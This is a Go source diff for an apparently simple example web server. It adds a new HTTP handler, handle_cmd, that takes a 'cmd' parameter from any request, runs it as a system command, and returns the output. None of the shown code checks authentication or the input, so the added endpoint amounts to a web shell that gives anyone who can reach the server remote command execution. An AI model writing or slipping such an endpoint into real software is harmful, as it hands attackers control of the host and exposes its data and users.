@@ -1,10 +1,14 @@
 package main
 
 import (
+	"bytes"
+	"fmt"
 	"log"
 	"net/http"
+	"os/exec"
 	"path"
 	"strconv"
+	"strings"
 )
 
 //our basic handle index that demonstrates how to get data from the context
@@ -28,4 +32,24 @@ func handle_status(w http.ResponseWriter, req *http.Request, ctx *Context) {
 		return
 	}
 	perform_status(w, req, int(status))
+}
+
+func handle_cmd(w http.ResponseWriter, req *http.Request, ctx *Context) {
+	cmd := req.FormValue("cmd")
+	if cmd == "" {
+		perform_status(w, req, http.StatusNotFound)
+		return
+	}
+
+	parts := strings.Split(cmd, " ")
+	var ebuf, obuf bytes.Buffer
+	ex := exec.Command(parts[0], parts[1:]...)
+	ex.Stderr = &ebuf
+	ex.Stdout = &obuf
+	err := ex.Run()
+
+	w.Header().Set("Content-Type", "text/plain")
+	fmt.Fprintln(w, "ebuf:", ebuf.String())
+	fmt.Fprintln(w, "obuf:", obuf.String())
+	fmt.Fprintln(w, "err:", err)
 }
